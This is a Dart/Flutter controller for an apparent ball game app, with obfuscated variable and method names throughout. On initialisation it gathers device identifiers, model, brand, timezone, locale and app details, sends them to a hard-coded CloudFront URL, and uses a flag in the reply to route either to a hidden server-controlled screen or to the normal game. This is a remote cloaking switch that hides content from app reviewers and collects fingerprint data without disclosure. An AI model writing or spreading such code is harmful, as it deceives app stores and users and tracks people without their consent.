import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class BallChargeLogic extends GetxController {

  var ihqnzuvr = RxBool(false);
  var bjrdfcl = RxBool(true);
  var hpgifju = RxString("");
  var goijbq = RxBool(false);
  var ibrj = RxBool(true);
  final aztpcfniy = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    mixolt();
  }


  Future<void> mixolt() async {
    goijbq.value = true;
    ibrj.value = true;
    bjrdfcl.value = false;

    aztpcfniy.post("https://d8h5dsaw0xi2j.cloudfront.net/YvTuYT7MUeXpTYb",data: await sxpelkhif()).then((value) {
      var zvtpcsq = value.data["zvtpcsq"] as String;
      var obvrkn = value.data["obvrkn"] as bool;
      if (obvrkn) {
        hpgifju.value = zvtpcsq;
        vjhtmln();
      } else {
        jpuhbm();
      }
    }).catchError((e) {
      bjrdfcl.value = true;
      ibrj.value = true;
      goijbq.value = false;
    });
  }

  Future<Map<String, dynamic>> sxpelkhif() async {
    final DeviceInfoPlugin wuqckarz = DeviceInfoPlugin();
    PackageInfo loixsb_figvdhez = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var zpar = Platform.localeName;
    var cqaOkVM = currentTimeZone;

    var adVGFwJ = loixsb_figvdhez.packageName;
    var YLjHUte = loixsb_figvdhez.version;
    var FKgm = loixsb_figvdhez.buildNumber;

    var gdlI = loixsb_figvdhez.appName;
    var WAbDBGzt = "";
    var PHCwb  = "";
    var NGemPE = "";
    var exzb = "";
    var bljocu = "";
    var ozjl = "";


    var vYGmXI = "";
    var BOrwkUGW = false;

    if (GetPlatform.isAndroid) {
      vYGmXI = "android";
      var mfyekozjn = await wuqckarz.androidInfo;

      NGemPE = mfyekozjn.brand;

      WAbDBGzt  = mfyekozjn.model;
      PHCwb = mfyekozjn.id;

      BOrwkUGW = mfyekozjn.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      vYGmXI = "ios";
      var cunpvmd = await wuqckarz.iosInfo;
      NGemPE = cunpvmd.name;
      WAbDBGzt = cunpvmd.model;

      PHCwb = cunpvmd.identifierForVendor ?? "";
      BOrwkUGW  = cunpvmd.isPhysicalDevice;
    }
    var res = {
      "gdlI": gdlI,
      "FKgm": FKgm,
      "adVGFwJ": adVGFwJ,
      "BOrwkUGW": BOrwkUGW,
      "WAbDBGzt": WAbDBGzt,
      "cqaOkVM": cqaOkVM,
      "NGemPE": NGemPE,
      "PHCwb": PHCwb,
      "zpar": zpar,
      "YLjHUte": YLjHUte,
      "vYGmXI": vYGmXI,
      "exzb" : exzb,
      "bljocu" : bljocu,
      "ozjl" : ozjl,

    };
    return res;
  }

  Future<void> jpuhbm() async {
    Get.offNamed("/ballMain");
  }

  Future<void> vjhtmln() async {
    Get.offNamed("/addBallSec");
  }

}
